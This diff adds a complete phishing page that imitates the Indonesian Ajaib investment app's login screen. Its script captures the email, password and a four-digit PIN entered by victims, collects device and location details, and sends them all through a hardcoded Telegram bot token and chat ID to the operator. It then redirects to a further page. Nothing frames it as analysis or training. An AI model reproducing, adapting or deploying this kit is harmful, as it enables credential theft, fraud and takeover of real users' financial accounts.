@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masuk | Ajaib</title>
+  <meta name="description" content="Login | Masuk ke akun Ajaib kamu dengan aman dan cepat.">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
+
+  <style>
+    body {
+      margin: 0; padding: 0;
+      background: #fff;
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      max-width: 360px;
+      margin: auto;
+      padding: 20px;
+    }
+    .logo {
+      display: block;
+      margin: 20px auto;
+      width: 160px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .form-label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #ccc;
+    }
+    .input-wrapper input {
+      flex: 1;
+      border: none;
+      padding: 12px 0;
+      font-size: 1rem;
+      outline: none;
+      background: transparent;
+    }
+    .toggle-password {
+      background: none;
+      border: none;
+      color: #888;
+      cursor: pointer;
+      padding: 0 8px;
+      font-size: 1rem;
+    }
+    .text-danger {
+      color: red;
+      font-size: 0.8rem;
+      display: none;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      color: white;
+      font-weight: 500;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 100px;
+    }
+    .link {
+      font-weight: 300;
+      font-size: 0.95rem;
+      color: #4a8fe7;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+    .text-center {
+      text-align: center;
+    }
+    .footer-info {
+      margin-top: 40px;
+      text-align: center;
+      background: #4da4ff;
+      color: white;
+      padding: 20px;
+      font-weight: 500;
+      border-radius: 12px 12px 0 0;
+    }
+    .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      margin-left: 8px;
+      animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .pin-popup {
+      position: fixed;
+      bottom: -100%;
+      left: 0; right: 0;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 16px 16px 0 0;
+      transition: bottom 0.4s ease-in-out;
+      z-index: 999;
+    }
+    .pin-popup.show { bottom: 0; }
+    .pin-popup h2 {
+      text-align: center;
+      font-size: 1.1rem;
+      margin-bottom: 16px;
+      font-weight: 400;
+    }
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+    .pin-inputs input {
+      width: 48px;
+      height: 56px;
+      font-size: 1.5rem;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://i.imghippo.com/files/LQ3613FYs.png" alt="Logo Ajaib" class="logo" />
+    <h1></h1>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="email" class="form-label">Email</label>
+        <div class="input-wrapper">
+          <input type="email" id="email" placeholder="Masukkan email" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="password" class="form-label">Password</label>
+        <div class="input-wrapper">
+          <input type="password" id="password" placeholder="Masukkan password" required />
+          <button type="button" class="toggle-password" id="togglePwd">
+            <i class="fa fa-eye"></i>
+          </button>
+        </div>
+        <small id="passwordError" class="text-danger">Password harus mengandung huruf, angka, dan simbol.</small>
+      </div>
+
+      <a href="#" class="link">Lupa password?</a>
+      <button type="submit" class="btn" id="loginBtn">
+        <span id="btnText">Masuk</span>
+        <span class="spinner" id="btnSpinner"></span>
+      </button>
+    </form>
+
+    <div class="text-center mt-3">
+      <p>Belum punya akun? <a href="#" class="link">Daftar</a></p>
+    </div>
+  </div>
+
+  <div class="footer-info">4 Alasan Ajaib Dipercaya 1 Juta++</div>
+
+  <!-- PIN Popup -->
+  <div class="pin-popup" id="pinPopup">
+    <h2>Masukkan PIN Ajaib Kamu</h2>
+    <div class="pin-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+    </div>
+    <button class="btn" style="margin-top:20px;" onclick="submitPIN()">Konfirmasi</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8454668216:AAGp2ELxgcg3m_jM-VMziqVvuRZjf807fV4";
+    const CHAT_ID = "6421376306";
+
+    document.getElementById("togglePwd").addEventListener("click", () => {
+      const pwd = document.getElementById("password");
+      const icon = document.querySelector("#togglePwd i");
+      pwd.type = pwd.type === "password" ? "text" : "password";
+      icon.classList.toggle("fa-eye-slash");
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+      const error = document.getElementById("passwordError");
+
+      const isValid = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[^a-zA-Z0-9]).{6,}$/.test(password);
+      if (!isValid) {
+        error.style.display = "block";
+        return;
+      } else {
+        error.style.display = "none";
+      }
+
+      document.getElementById("btnText").style.display = "none";
+      document.getElementById("btnSpinner").style.display = "inline-block";
+      document.getElementById("loginBtn").disabled = true;
+
+      const device = navigator.userAgent;
+      const loginTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      let location = "Tidak diketahui";
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=ce1df7fbc7b225");
+        const data = await res.json();
+        if (data.city && data.region && data.country) {
+          location = `${data.city}, ${data.region}, ${data.country}`;
+        }
+      } catch {
+        location = "Gagal deteksi lokasi";
+      }
+
+      try {
+        // ✅ Simpan email ke localStorage
+        localStorage.setItem('ajaib_email', email);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text:
+              `🟢 𝗗𝗔𝗧𝗔 𝗟𝗢𝗚𝗜𝗡 𝗔𝗝𝗔𝗜𝗕 ✅️\n` +
+              `📧 Email: ${email}\n` +
+              `🔒 Password: ${password}\n` +
+              `📱 Perangkat: ${device}\n` +
+              `🕒 Waktu Login: ${loginTime}`
+          })
+        });
+      } catch (err) {
+        console.error("Telegram Error:", err);
+      }
+
+      setTimeout(() => {
+        document.getElementById("btnText").style.display = "inline";
+        document.getElementById("btnSpinner").style.display = "none";
+        document.getElementById("loginBtn").disabled = false;
+
+        const popup = document.getElementById("pinPopup");
+        popup.classList.add("show");
+
+        const inputs = popup.querySelectorAll(".pin-inputs input");
+        inputs[0].focus();
+        inputs.forEach((input, i) => {
+          input.addEventListener("input", () => {
+            if (input.value && i < inputs.length - 1) {
+              inputs[i + 1].focus();
+            }
+          });
+        });
+      }, 1500);
+    });
+
+    function submitPIN() {
+      const inputs = document.querySelectorAll(".pin-inputs input");
+      const pin = Array.from(inputs).map(i => i.value).join("");
+
+      if (pin.length !== 4) {
+        alert("Harap isi 4 digit PIN");
+        return;
+      }
+
+      const pinTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text:
+            `🔐 VERIFIKASI PIN AJAIB\n` +
+            `🔢 PIN: ${pin}\n` +
+            `🕒 Waktu Masuk: ${pinTime}`
+        })
+      }).then(() => {
+        document.getElementById("pinPopup").classList.remove("show");
+        inputs.forEach(i => i.value = "");
+        window.location.href = "emailajaib1.html";
+      }).catch(err => {
+        alert("Gagal mengirim PIN. Coba lagi.");
+        console.error("Telegram Error:", err);
+      });
+    }
+  </script>
+</body>
+</html>
